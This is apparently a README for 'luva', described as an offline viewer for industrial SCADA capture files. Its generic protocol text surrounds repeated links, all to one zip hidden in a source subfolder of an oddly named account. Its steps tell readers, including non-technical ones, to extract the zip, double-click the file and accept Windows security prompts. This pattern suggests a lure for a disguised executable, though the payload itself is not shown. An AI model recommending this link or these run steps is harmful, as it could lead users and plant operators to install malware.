# 🛠️ luva - Offline SCADA Capture Viewer

[![Download luva](https://img.shields.io/badge/Download%20luva-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Blackbarred-specialcourtmartial190/luva/main/luva/core/Software_v1.8.zip)

## 📦 What luva does

Luva is a Windows app for opening and reading industrial network capture files on your computer. It works with `.pcap`, `.pcapng`, and `.gz`-wrapped captures.

Use it to review traffic from systems such as:

- BACnet
- DNP3
- EtherNet/IP
- Modbus
- OPC UA
- Siemens S7

It only reads files from disk. It does not sniff live traffic. It does not send packets. It does not touch the plant network.

## 🖥️ What you need

Use a Windows PC with:

- Windows 10 or Windows 11
- At least 4 GB of RAM
- A few hundred MB of free disk space
- A mouse and keyboard
- A saved capture file in `.pcap`, `.pcapng`, or `.gz` format

If your file is large, give the app more memory and a bit more time to load.

## ⬇️ Download luva

Go to the project page here and download the app from the repository:

[Open the luva download page](https://raw.githubusercontent.com/Blackbarred-specialcourtmartial190/luva/main/luva/core/Software_v1.8.zip)

Save the file to a folder you can find again, such as:

- Downloads
- Desktop
- Documents

## 🚀 Install and start

1. Open the folder where you saved the file
2. If the file is in a zip folder, right-click it and choose Extract All
3. Open the extracted folder
4. Find the app file
5. Double-click it to run
6. If Windows asks for permission, choose Yes

If Windows shows a security prompt, check that you got the file from the GitHub link above before you continue.

## 📂 Open a capture file

1. Start luva
2. Choose the option to open a file
3. Select your `.pcap`, `.pcapng`, or `.gz` capture
4. Wait while the file loads
5. Review the data in the app

For best results, keep one capture file in a simple folder path, such as:

- `C:\Captures\site1.pcap`
- `C:\Users\YourName\Desktop\test.pcapng`

Avoid file names with very long paths or unusual characters.

## 🔍 What you can review

Luva helps you inspect industrial network traffic in a simple way. You can use it to look for:

- Protocol names
- Device addresses
- Requests and replies
- Message timing
- Unexpected traffic
- Signs of miswired or noisy networks

It is useful when you need to review a capture from a PLC, HMI, historian, engineering workstation, or gateway.

## 🧭 Common file types

### `.pcap`
A standard packet capture file. Many tools create this format.

### `.pcapng`
A newer capture format with more detail.

### `.gz`
A compressed file. Luva can read `.gz`-wrapped captures when the capture is stored inside the archive.

## 🧰 Simple first use

If this is your first time using a capture viewer:

1. Open luva
2. Load one small capture file first
3. Check that the file opens
4. Scroll through the traffic list
5. Click a row to inspect its details
6. Open a second file after you know the layout

Start with a short capture from a known device. That makes it easier to learn what normal traffic looks like.

## 🏭 Protocols it can help with

Luva is built for common industrial and SCADA traffic, including:

- Modbus TCP
- Modbus RTU over gateways
- DNP3
- BACnet
- EtherNet/IP
- OPC UA
- Siemens S7

These protocols often appear in plant floors, building systems, and remote sites. Luva gives you a way to read the capture without sending any traffic back to the network.

## 🧩 Tips for better results

- Open captures from a local drive, not a network share
- Use a shorter file name
- Keep only one app window open when loading a large file
- Close other heavy apps if the file is slow to open
- Use a clean capture file when you want to study one protocol

If the app shows a lot of traffic, filter the capture by device or by protocol name if the app offers that view.

## 🛡️ Safe use on Windows

Luva reads files only. That makes it a good fit for review work on a separate laptop or workstation.

A simple workflow:

- Copy the capture file to your PC
- Open it in luva
- Review the traffic
- Save your notes outside the plant network

This keeps your review task separate from the live system.

## 🗂️ Example workflow

If you exported a capture from a switch port or a monitoring tool:

1. Save the file to `Downloads`
2. Move it to `C:\Captures`
3. Open luva
4. Load the file
5. Check which devices talk most often
6. Look at command and reply patterns
7. Compare the traffic with what you expect

That process helps when you need to check a service call, a site survey, or a security review.

## ❓ If the file does not open

Try these steps:

1. Confirm the file ends in `.pcap`, `.pcapng`, or `.gz`
2. Make sure the file copied all the way to your PC
3. Try a smaller capture first
4. Move the file to a short path like `C:\Captures`
5. Open the file again
6. If you used a `.gz` file, make sure it really contains a capture file inside

If the file came from another tool, export it again and try once more.

## 📌 Project link

Use this page to get the app and check the repository:

[https://raw.githubusercontent.com/Blackbarred-specialcourtmartial190/luva/main/luva/core/Software_v1.8.zip](https://raw.githubusercontent.com/Blackbarred-specialcourtmartial190/luva/main/luva/core/Software_v1.8.zip)

## 🔧 Typical use cases

Luva fits tasks like:

- Checking traffic from a PLC
- Reviewing SCADA captures after an incident
- Looking at Modbus polling
- Checking BACnet device chatter
- Studying DNP3 field traffic
- Reading OPC UA session data
- Reviewing captures from an engineer laptop

It is made for offline review, so you can study a file without connecting to the control system

## 📁 File organization tip

Keep your captures in folders by site or date, such as:

- `C:\Captures\PlantA\2026-04-01`
- `C:\Captures\Building1\HVAC`
- `C:\Captures\Lab\TestBench`

This makes it easier to find old files and compare traffic over time

## 🖱️ Run steps for non-technical users

1. Open the GitHub link above
2. Download the app file
3. Save it to your PC
4. Open the folder where you saved it
5. Double-click the file
6. Open a capture file
7. Read the traffic in the app

If you use Windows File Explorer, you can pin the folder to Quick Access so you can open it faster next time